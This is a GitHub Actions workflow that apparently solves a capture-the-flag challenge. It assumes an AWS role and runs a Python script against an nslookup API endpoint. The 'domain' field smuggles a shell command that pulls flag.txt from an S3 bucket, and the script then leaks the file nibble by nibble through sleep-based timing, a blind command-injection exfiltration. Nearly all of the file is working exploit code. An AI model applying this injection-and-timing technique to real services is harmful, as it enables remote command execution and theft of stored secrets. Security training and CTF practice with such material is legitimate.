name: Stage2-17-Extract-Flag

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  extract:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Extract flag
        run: |
          python3 - <<'PY'
          import os
          import time
          import requests
          from requests_aws4auth import AWS4Auth

          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          session = requests.Session()

          def probe(index, shift):
              domain = (
                  "example.com; "
                  "/opt/aws s3api get-object "
                  "--bucket logad88e2b168aa387e "
                  "--key flag.txt "
                  "/tmp/log-flag.txt "
                  "--region us-east-1 "
                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
                  ">/dev/null 2>&1 && "
                  f"b=$(od -An -tu1 -N1 -j{index} /tmp/log-flag.txt | tr -d ' '); "
                  f"n=$(((b >> {shift}) & 15)); "
                  "sleep \"$n\""
              )

              start = time.monotonic()

              response = session.post(
                  api,
                  json={"domain": domain},
                  auth=auth,
                  timeout=25
              )

              elapsed = time.monotonic() - start
              value = round(elapsed)

              print(
                  "INDEX=%d SHIFT=%d ELAPSED=%.2f NIBBLE=%d"
                  % (index, shift, elapsed, value)
              )

              return value & 15

          flag = []

          for index in range(48):
              high = probe(index, 4)
              low = probe(index, 0)

              value = (high << 4) | low

              if value == 0:
                  break

              char = chr(value)
              flag.append(char)

              print(
                  "BYTE=%d VALUE=%d CHAR=%r"
                  % (index, value, char)
              )

              if char == "}":
                  break

          print("FLAG=" + "".join(flag))
          PY
